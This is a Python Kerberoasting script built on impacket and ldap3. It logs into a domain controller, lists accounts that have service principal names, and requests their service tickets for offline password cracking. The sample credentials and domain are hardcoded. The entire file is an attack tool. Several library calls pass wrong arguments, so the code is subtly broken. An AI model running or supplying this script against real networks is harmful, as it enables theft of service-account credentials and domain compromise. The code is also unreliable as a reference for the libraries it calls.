from impacket.smbconnection import SMBConnection
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from ldap3 import Server, Connection, ALL_ATTRIBUTES

def kerberoast(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controller via SMB
        smb = SMBConnection(dc_ip, dc_ip)
        smb.login(username, password, domain)

        # Get TGT ticket for the specified user
        krbtgt_ticket = getKerberosTGT(username, domain, dc_ip, None, None)
        if krbtgt_ticket:
            print("Successfully obtained krbtgt ticket.")
            
            # Query LDAP for user objects with SPN attributes set
            server = Server(dc_ip, get_info=ALL_ATTRIBUTES)
            conn = Connection(server, user=username, password=password, authentication='NTLM')
            conn.bind()
            conn.search(search_base='DC=' + domain.replace('.', ',DC='),
                         search_filter='(&(objectClass=user)(servicePrincipalName=*))',
                         attributes=['sAMAccountName', 'servicePrincipalName'])
            results = conn.entries

            if results:
                print("Kerberoastable Accounts:")
                for entry in results:
                    account_name = entry['sAMAccountName'].value
                    spns = entry['servicePrincipalName'].values
                    for spn in spns:
                        # Kerberoast each account
                        principal = Principal(spn, type=Principal.NT_PRINCIPAL)
                        tgs_rep = getKerberosTGS(krbtgt_ticket, principal)
                        print(f"TGS_REP for {account_name} ({spn}):")
                        print(tgs_rep.native)
            else:
                print("No kerberoastable accounts found.")
        else:
            print("Failed to obtain krbtgt ticket.")

    except Exception as e:
        print(f"Error while Kerberoasting: {e}")

# Example usage:
# Replace "username", "password", "domain", and "dc_ip" with your actual credentials and domain controller's IP address
username = "ajman"
password = "DomainAdmin123!"
domain = "snaplabs.local"
dc_ip = "10.10.0.86"  # Replace with your domain controller's IP address

kerberoast(username, password, domain, dc_ip)